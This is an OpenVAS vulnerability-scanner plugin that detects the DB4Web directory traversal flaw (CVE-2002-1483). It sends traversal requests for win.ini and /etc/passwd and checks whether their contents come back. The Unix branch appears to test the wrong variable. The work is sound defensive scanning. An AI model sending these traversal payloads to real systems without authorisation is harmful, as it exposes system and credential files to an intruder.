# OpenVAS Vulnerability Test
# $Id: db4web_dir_trav.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: DB4Web directory traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It is possible to read any file on your 
system through the DB4Web software.";

tag_solution = "Upgrade your software.";

# References:
#
# From:Stefan.Bagdohn@guardeonic.com
# To:vulnwatch@vulnwatch.org 
# Date: Thu, 19 Sep 2002 11:00:55 +0200
# Subject: Advisory: File disclosure in DB4Web

if(description)
{
 script_id(11182);
 script_version("$Revision: 8023 $");
 script_bugtraq_id(5723);
 script_cve_id("CVE-2002-1483");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  
 name = "DB4Web directory traversal";
 script_name(name);
 

 
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");

 family = "Web application abuses";
 script_family(family);
 	

 script_dependencies("find_service.nasl", "no404.nasl", "httpver.nasl",
                    "http_version.nasl", 
                    "webmirror.nasl", "DDI_Directory_Scanner.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

cgis = get_kb_list("www/" + port + "/cgis");
if (isnull(cgis)) exit(0);
# cgis = make_list(cgis);

k = string("www/no404/", port);
qc=1;
if (get_kb_item(k)) qc=0;

n = 0;
foreach cgi (cgis)
{
  if ("/db4web_c.exe/" >< cgi)
  {
    # Windows
    end = strstr(cgi, "/db4web_c.exe/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwindows%5Cwin.ini");
    if (check_win_dir_trav_ka(port: port, url: u))
    {
      security_message(port);
      exit(0);
    }
    u = strcat(dir, "/db4web_c.exe/c%3A%5Cwinnt%5Cwin.ini");
    if (check_win_dir_trav_ka(port: port, url: u))
    {
      security_message(port);
      exit(0);
    }
    n ++;
  }
  else if ("/db4web_c/" >< dir)
  {
    # Unix
    end = strstr(cgi, "/db4web_c/");
    dir = cgi - end;
    u = strcat(dir, "/db4web_c//etc/passwd");
    req = http_get(port: port, item: u);
    r = http_keepalive_send_recv(port:port, data:req);
    if( r == NULL )exit(0);
    if ("root:" >< r)
    {
      security_message(port);
      exit(0);
    }
    n ++;
  }
}

